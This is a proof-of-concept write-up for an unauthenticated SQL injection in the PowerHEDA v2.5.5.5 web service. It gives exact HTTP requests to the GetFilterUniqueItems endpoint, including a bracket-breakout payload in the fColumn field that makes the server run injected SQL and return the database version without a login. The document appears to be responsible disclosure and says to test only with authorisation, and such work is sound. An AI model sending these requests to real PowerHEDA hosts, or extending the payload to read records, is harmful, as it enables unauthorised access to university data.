# Proof of Concept — Unauthenticated SQL Injection in PowerHEDA v2.5.5.5

Reproduce only on a lab instance or a host you are authorised to test. Do not run these requests against third-party universities.

The customer hostname is withheld. Host header below is `<powerheda-host>`.

---

## 1. Confirm identifier concatenation

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json

{"fColumn":"1","fKey":"5","fWhere":""}
```

**Expected:** HTTP `500` (server error). The body is a SQL exception:

```text
Invalid column name '1'.
```

The stack names `GetFilterUniqueItems` (`HedaDataRetrieval.asmx.vb` line 600) and `db.GetData` (`db.vb` line 201).

---

## 2. Confirm SQL execution (version string only)

The server treats `fColumn` as a bracketed identifier. A breakout of the form:

```text
x] FROM (SELECT @@VERSION AS [x]) t --
```

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json

{"fColumn":"x] FROM (SELECT @@VERSION AS [x]) t --","fKey":"5","fWhere":""}
```

**Expected:** HTTP `200` JSON containing the SQL Server version, for example:

```json
{"d":["Microsoft SQL Server ..."]}
```

(The exact edition string depends on the host.)

---

## 3. Confirm no login is required

Repeat step 2 **without** any `Cookie` header. On the tested build the JSON body is unchanged.
